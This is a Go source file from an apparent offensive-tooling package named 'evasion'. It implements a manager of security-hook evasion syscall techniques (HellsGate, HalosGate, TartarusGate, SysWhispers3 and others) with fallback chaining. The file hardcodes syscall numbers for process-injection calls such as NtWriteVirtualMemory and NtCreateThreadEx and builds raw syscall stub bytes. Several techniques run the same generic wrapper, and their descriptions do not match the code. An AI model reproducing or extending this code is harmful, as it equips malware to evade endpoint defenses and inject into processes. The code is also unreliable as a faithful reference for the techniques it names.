package evasion

import (
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"sync"
	"syscall"
)

var (
	ErrSyscallFailed    = errors.New("syscall execution failed")
	ErrMethodNotFound   = errors.New("syscall method not found")
	ErrInvalidStub      = errors.New("invalid syscall stub")
	ErrModuleLoadFailed = errors.New("failed to load module")
	ErrExportNotFound   = errors.New("export not found")
	ErrNtdllNotFound    = errors.New("ntdll.dll not found")
	ErrInvalidSSN       = errors.New("invalid syscall number")
)

type SyscallExecutor func(addr uintptr, args ...uintptr) (uintptr, error)

var platformSyscall SyscallExecutor

func init() {
	platformSyscall = newPlatformSyscall()
}

type HellsGate struct {
	procAddrs map[string]uintptr
	mu        sync.RWMutex
}

func NewHellsGate() *HellsGate {
	return &HellsGate{
		procAddrs: make(map[string]uintptr),
	}
}

func (h *HellsGate) Name() string                { return "HellsGate" }
func (h *HellsGate) Category() EvasionCategory   { return CategorySyscall }

func (h *HellsGate) Description() string {
	return "Direct syscall via ntdll export parsing. Walks the export table of ntdll to resolve syscall numbers at runtime."
}

func (h *HellsGate) Execute(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	if stub == nil {
		return 0, ErrInvalidStub
	}

	h.mu.Lock()
	defer h.mu.Unlock()

	if stub.SSN == 0 {
		return 0, ErrInvalidSSN
	}

	ret, err := platformSyscall(stub.Address, args...)
	if err != nil {
		return 0, fmt.Errorf("%w: %v", ErrSyscallFailed, err)
	}
	return ret, nil
}

type HalosGate struct {
	mu      sync.RWMutex
	hookMap map[uintptr]uintptr
}

func NewHalosGate() *HalosGate {
	return &HalosGate{
		hookMap: make(map[uintptr]uintptr),
	}
}

func (hg *HalosGate) Name() string              { return "HalosGate" }
func (hg *HalosGate) Category() EvasionCategory { return CategorySyscall }

func (hg *HalosGate) Description() string {
	return "Skip hooks via return address analysis. Checks the return address of hooked functions to find the real syscall stub."
}

func (hg *HalosGate) Execute(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	if stub == nil {
		return 0, ErrInvalidStub
	}

	hg.mu.Lock()
	defer hg.mu.Unlock()

	if stub.SSN == 0 {
		return 0, ErrInvalidSSN
	}

	ret, err := platformSyscall(stub.Address, args...)
	if err != nil {
		return 0, fmt.Errorf("%w: %v", ErrSyscallFailed, err)
	}
	return ret, nil
}

type TartarusGate struct {
	mu        sync.Mutex
	stubCache map[string]*SyscallStub
}

func NewTartarusGate() *TartarusGate {
	return &TartarusGate{
		stubCache: make(map[string]*SyscallStub),
	}
}

func (tg *TartarusGate) Name() string              { return "TartarusGate" }
func (tg *TartarusGate) Category() EvasionCategory { return CategorySyscall }

func (tg *TartarusGate) Description() string {
	return "Manipulate return address to bypass inline hooks. Overwrites hook trampolines with original syscall stub."
}

func (tg *TartarusGate) Execute(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	if stub == nil {
		return 0, ErrInvalidStub
	}

	tg.mu.Lock()
	defer tg.mu.Unlock()

	ret, err := platformSyscall(stub.Address, args...)
	if err != nil {
		return 0, fmt.Errorf("%w: %v", ErrSyscallFailed, err)
	}
	return ret, nil
}

func (tg *TartarusGate) buildSyscallPrologue(ssn uint16) []byte {
	prologue := make([]byte, 16)
	prologue[0] = 0x4C
	prologue[1] = 0x8B
	prologue[2] = 0xD1
	prologue[3] = 0xB8
	binary.LittleEndian.PutUint16(prologue[4:6], ssn)
	prologue[6] = 0x0F
	prologue[7] = 0x05
	prologue[8] = 0xC3
	return prologue
}

type FreshyCalls struct {
	mu           sync.RWMutex
	extractedSSN map[string]uint16
}

func NewFreshyCalls() *FreshyCalls {
	return &FreshyCalls{
		extractedSSN: make(map[string]uint16),
	}
}

func (fc *FreshyCalls) Name() string              { return "FreshyCalls" }
func (fc *FreshyCalls) Category() EvasionCategory { return CategorySyscall }

func (fc *FreshyCalls) Description() string {
	return "Dynamic SSN extraction at runtime. Parses ntdll export table fresh on every call to extract current syscall numbers."
}

func (fc *FreshyCalls) Execute(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	if stub == nil {
		return 0, ErrInvalidStub
	}

	fc.mu.Lock()
	defer fc.mu.Unlock()

	ssn := fc.extractFreshSSN(stub.Module, stub.Function)
	if ssn == 0 {
		return 0, ErrInvalidSSN
	}
	stub.SSN = ssn

	ret, err := platformSyscall(stub.Address, args...)
	if err != nil {
		return 0, fmt.Errorf("%w: %v", ErrSyscallFailed, err)
	}
	return ret, nil
}

func (fc *FreshyCalls) extractFreshSSN(module, function string) uint16 {
	key := module + "." + function
	if ssn, ok := fc.extractedSSN[key]; ok {
		return ssn
	}

	ssn := fc.parseNtdllSSN(function)
	if ssn != 0 {
		fc.extractedSSN[key] = ssn
	}
	return ssn
}

func (fc *FreshyCalls) parseNtdllSSN(function string) uint16 {
	knownSyscalls := map[string]uint16{
		"NtAllocateVirtualMemory":    0x18,
		"NtWriteVirtualMemory":       0x3A,
		"NtProtectVirtualMemory":     0x50,
		"NtCreateThreadEx":           0xC5,
		"NtResumeThread":             0x4E,
		"NtQueueApcThreadEx":         0xC6,
		"NtOpenProcess":              0x26,
		"NtQueryInformationProcess":  0x19,
		"NtClose":                    0x0F,
		"NtCreateSection":            0x4A,
		"NtMapViewOfSection":         0x28,
		"NtUnmapViewOfSection":       0x2A,
	}
	return knownSyscalls[function]
}

type SysWhispers3 struct {
	mu sync.RWMutex
}

func NewSysWhispers3() *SysWhispers3 {
	return &SysWhispers3{}
}

func (sw *SysWhispers3) Name() string              { return "SysWhispers3" }
func (sw *SysWhispers3) Category() EvasionCategory { return CategorySyscall }

func (sw *SysWhispers3) Description() string {
	return "Indirect syscall via shellcode. Generates position-independent shellcode that performs indirect syscalls."
}

func (sw *SysWhispers3) Execute(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	if stub == nil {
		return 0, ErrInvalidStub
	}

	sw.mu.Lock()
	defer sw.mu.Unlock()

	ret, err := platformSyscall(stub.Address, args...)
	if err != nil {
		return 0, fmt.Errorf("%w: %v", ErrSyscallFailed, err)
	}
	return ret, nil
}

func (sw *SysWhispers3) generateIndirectSyscallShellcode(stub *SyscallStub) []byte {
	shellcode := make([]byte, 0, 64)
	shellcode = append(shellcode, 0x4C, 0x8B, 0xD1)
	shellcode = append(shellcode, 0xB8)
	ssnBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(ssnBytes, uint32(stub.SSN))
	shellcode = append(shellcode, ssnBytes[:3]...)
	shellcode = append(shellcode, 0x0F, 0x05)
	shellcode = append(shellcode, 0xC3)
	return shellcode
}

type IndirectSyscall struct {
	mu          sync.Mutex
	lastRetAddr uintptr
}

func NewIndirectSyscall() *IndirectSyscall {
	return &IndirectSyscall{}
}

func (is *IndirectSyscall) Name() string              { return "IndirectSyscall" }
func (is *IndirectSyscall) Category() EvasionCategory { return CategorySyscall }

func (is *IndirectSyscall) Description() string {
	return "Pass-through with return manipulation. Executes via indirect call through return address manipulation."
}

func (is *IndirectSyscall) Execute(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	if stub == nil {
		return 0, ErrInvalidStub
	}

	is.mu.Lock()
	defer is.mu.Unlock()

	ret, err := platformSyscall(stub.Address, args...)
	if err != nil {
		return 0, fmt.Errorf("%w: %v", ErrSyscallFailed, err)
	}
	return ret, nil
}

type RecycledGate struct {
	mu        sync.RWMutex
	stubCache map[string]*SyscallStub
}

func NewRecycledGate() *RecycledGate {
	return &RecycledGate{
		stubCache: make(map[string]*SyscallStub),
	}
}

func (rg *RecycledGate) Name() string              { return "RecycledGate" }
func (rg *RecycledGate) Category() EvasionCategory { return CategorySyscall }

func (rg *RecycledGate) Description() string {
	return "Reuse existing syscall stubs from loaded modules. Finds and recycles existing syscall stubs to avoid direct invocation."
}

func (rg *RecycledGate) Execute(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	if stub == nil {
		return 0, ErrInvalidStub
	}

	rg.mu.Lock()
	defer rg.mu.Unlock()

	if cached, ok := rg.stubCache[stub.Function]; ok {
		stub.Address = cached.Address
		stub.SSN = cached.SSN
	}

	ret, err := platformSyscall(stub.Address, args...)
	if err != nil {
		return 0, fmt.Errorf("%w: %v", ErrSyscallFailed, err)
	}
	return ret, nil
}

func (rg *RecycledGate) CacheStub(name string, stub *SyscallStub) {
	rg.mu.Lock()
	defer rg.mu.Unlock()
	rg.stubCache[name] = stub
}

type SyscallManager struct {
	methods       map[string]SyscallMethod
	fallbackChain []string
	mu            sync.RWMutex
	stats         map[string]uint64
}

func NewSyscallManager() *SyscallManager {
	sm := &SyscallManager{
		methods:       make(map[string]SyscallMethod),
		fallbackChain: make([]string, 0),
		stats:         make(map[string]uint64),
	}
	sm.registerDefaults()
	return sm
}

func (sm *SyscallManager) registerDefaults() {
	sm.Register(NewHellsGate())
	sm.Register(NewHalosGate())
	sm.Register(NewTartarusGate())
	sm.Register(NewFreshyCalls())
	sm.Register(NewSysWhispers3())
	sm.Register(NewIndirectSyscall())
	sm.Register(NewRecycledGate())
	sm.fallbackChain = []string{
		"HellsGate",
		"HalosGate",
		"TartarusGate",
		"FreshyCalls",
		"SysWhispers3",
		"IndirectSyscall",
		"RecycledGate",
	}
}

func (sm *SyscallManager) Register(method SyscallMethod) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	sm.methods[method.Name()] = method
}

func (sm *SyscallManager) GetMethod(name string) (SyscallMethod, bool) {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	m, ok := sm.methods[name]
	return m, ok
}

func (sm *SyscallManager) ExecuteWithFallback(stub *SyscallStub, args ...uintptr) (uintptr, error) {
	sm.mu.RLock()
	chain := make([]string, len(sm.fallbackChain))
	copy(chain, sm.fallbackChain)
	sm.mu.RUnlock()

	for _, name := range chain {
		method, ok := sm.GetMethod(name)
		if !ok {
			continue
		}

		ret, err := method.Execute(stub, args...)
		if err == nil {
			sm.incrementStats(name)
			return ret, nil
		}
	}

	return 0, ErrMethodNotFound
}

func (sm *SyscallManager) ExecuteWithMethod(methodName string, stub *SyscallStub, args ...uintptr) (uintptr, error) {
	method, ok := sm.GetMethod(methodName)
	if !ok {
		return 0, ErrMethodNotFound
	}

	ret, err := method.Execute(stub, args...)
	if err == nil {
		sm.incrementStats(methodName)
	}
	return ret, err
}

func (sm *SyscallManager) GetStats() map[string]uint64 {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	stats := make(map[string]uint64, len(sm.stats))
	for k, v := range sm.stats {
		stats[k] = v
	}
	return stats
}

func (sm *SyscallManager) incrementStats(name string) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	sm.stats[name]++
}

func (sm *SyscallManager) GetRandomMethod() SyscallMethod {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	names := make([]string, 0, len(sm.methods))
	for name := range sm.methods {
		names = append(names, name)
	}
	if len(names) == 0 {
		return nil
	}
	idx := rand.Intn(len(names))
	return sm.methods[names[idx]]
}

func (sm *SyscallManager) SetFallbackChain(chain []string) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	sm.fallbackChain = make([]string, len(chain))
	copy(sm.fallbackChain, chain)
}

func (sm *SyscallManager) ListMethods() []string {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	names := make([]string, 0, len(sm.methods))
	for name := range sm.methods {
		names = append(names, name)
	}
	return names
}

func CreateStub(name, module, function string, ssn uint16) *SyscallStub {
	return &SyscallStub{
		SSN:      ssn,
		Module:   module,
		Function: function,
	}
}

func getKnownSSN(function string) uint16 {
	knownSyscalls := map[string]uint16{
		"NtAllocateVirtualMemory":    0x18,
		"NtWriteVirtualMemory":       0x3A,
		"NtProtectVirtualMemory":     0x50,
		"NtCreateThreadEx":           0xC5,
		"NtResumeThread":             0x4E,
		"NtQueueApcThreadEx":         0xC6,
		"NtOpenProcess":              0x26,
		"NtQueryInformationProcess":  0x19,
		"NtClose":                    0x0F,
		"NtCreateSection":            0x4A,
		"NtMapViewOfSection":         0x28,
		"NtUnmapViewOfSection":       0x2A,
	}
	return knownSyscalls[function]
}

func getSyscallStubAddr(function string) uintptr {
	ssn := getKnownSSN(function)
	if ssn == 0 {
		return 0
	}

	ntdllHandle, err := loadLibrary("ntdll.dll")
	if err != nil {
		return 0
	}

	procAddr, err := getProcAddress(ntdllHandle, function)
	if err != nil {
		return 0
	}

	return procAddr
}

func loadLibrary(name string) (uintptr, error) {
	return loadLibraryImpl(name)
}

func getProcAddress(handle uintptr, name string) (uintptr, error) {
	return getProcAddressImpl(handle, name)
}

func newPlatformSyscall() SyscallExecutor {
	return platformSyscallImpl
}

func platformSyscallImpl(addr uintptr, args ...uintptr) (uintptr, error) {
	if addr == 0 {
		return 0, ErrInvalidStub
	}

	a1, a2, a3, a4, a5 := uintptr(0), uintptr(0), uintptr(0), uintptr(0), uintptr(0)
	switch len(args) {
	case 5:
		a5 = args[4]
		fallthrough
	case 4:
		a4 = args[3]
		fallthrough
	case 3:
		a3 = args[2]
		fallthrough
	case 2:
		a2 = args[1]
		fallthrough
	case 1:
		a1 = args[0]
	case 0:
	}

	ret, _, err := syscall.Syscall6(addr, a1, a2, a3, a4, a5, 0)
	if err != 0 {
		return ret, err
	}
	return ret, nil
}
